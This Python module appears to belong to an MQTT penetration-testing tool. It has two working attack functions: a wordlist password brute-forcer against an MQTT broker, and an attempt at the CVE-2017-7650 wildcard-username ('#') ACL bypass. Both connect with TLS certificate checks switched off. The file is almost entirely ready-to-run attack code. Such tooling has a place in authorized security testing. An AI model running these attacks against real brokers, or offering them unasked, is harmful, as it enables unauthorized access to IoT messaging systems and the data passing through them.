import paho.mqtt.client as mqtt
import ssl
from time import sleep
from random import randint
import sys

# callback function for the connect request
def on_connect_3(client, userdata, flags, rc):
    if (rc==0):
        client.connected = True

def on_connect_5(client, userdata, flags, rc, properties):
    '''if (properties):
        print(f"{client._client_id.decode()} properties {properties}", flush=True)'''
    on_connect_3(client, userdata, flags, rc)
    
"""
Performs the brute force attack

Parameters:
    ip_target (str):        The ip of the broker
    port (int):             The port to connect to
    username (str):         The username to use when trying all passwords from the wordlist
    wordlist_path (str):    The path to the wordlist file used to get the passwords to try
    tls_cert (str):         The path to the CA certificate used to connect over TLS

Returns:
    results ([bool, str]): array containing a password and the related boolean indicating if the
                           password worked or not
"""

def brute_force(ip_target, version, port, username, wordlist_path, tls_cert, client_cert, client_key):
    # open the wordlist file
    with open(wordlist_path) as f:
        # for each password we try to connect to the broker using it with the username
        # provided as paramenter of the function
        for line in f:
            try:
                password = line[:-1]
                password.strip()
                # try to connect
                client = mqtt.Client(protocol = mqtt.MQTTv5 if version == '5' else mqtt.MQTTv311)
                client.connected = False
                client.on_connect = on_connect_5 if version == '5' else on_connect_3
                client.username_pw_set(username, password)
                print('trying: '+username + ', '+ password)

                # if the tls_cert value is different from None, try to connect over TLS
                if tls_cert != None:
                    client.tls_set(tls_cert, client_cert, client_key, cert_reqs=ssl.CERT_NONE, tls_version=ssl.PROTOCOL_TLS, ciphers=None)
                    client.tls_insecure_set(True)
                client.connect(ip_target,port)
                client.loop_start()
                sleep(3)
                client.loop_stop()
                # if we are able to connect, we break the loop and we return the list of passwords and
                # if each password was working or not
                if (client.connected):
                    client.disconnect()
                    return [True,password]
            except KeyboardInterrupt:
                return [False,""]
            except:
                continue
    return [False,""]


"""
Try to exploit CVE-2017-7650, which 'allows clients with username or client id set to
'#' or '+' to bypass pattern based ACLs or third party plugins'.

Parameters:
    ip_target (str):        The ip of the broker
    port (int):             The port to connect to
    wordlist_path (str):    The path to the wordlist file used to get the passwords to try
    tls_cert (str):         The path to the CA certificate used to connect over TLS

Returns:
    results (bool):         boolean indicating if the attack worked or not
"""

def username_bug(ip_target, version, port, tls_cert, client_cert, client_key):
    client = mqtt.Client(protocol = mqtt.MQTTv5 if version == '5' else mqtt.MQTTv311)
    client.connected = False
    client.on_connect = on_connect_5 if version == '5' else on_connect_3
    client.username_pw_set('#', '')
    print('trying wildcard username: #')

    try:
        # if the tls_cert value is different from None, try to connect over TLS
        if tls_cert != None:
            client.tls_set(tls_cert, client_cert, client_key, cert_reqs=ssl.CERT_NONE, tls_version=ssl.PROTOCOL_TLS, ciphers=None)
            client.tls_insecure_set(True)
        client.connect(ip_target,port)
        client.loop_start()
        sleep(3)
        client.loop_stop()
        # if we are able to connect, we break the loop and we return the list of passwords and
        # if each password was working or not
    except:
        pass
        
    if client.connected:
        return True
    else:
        return False
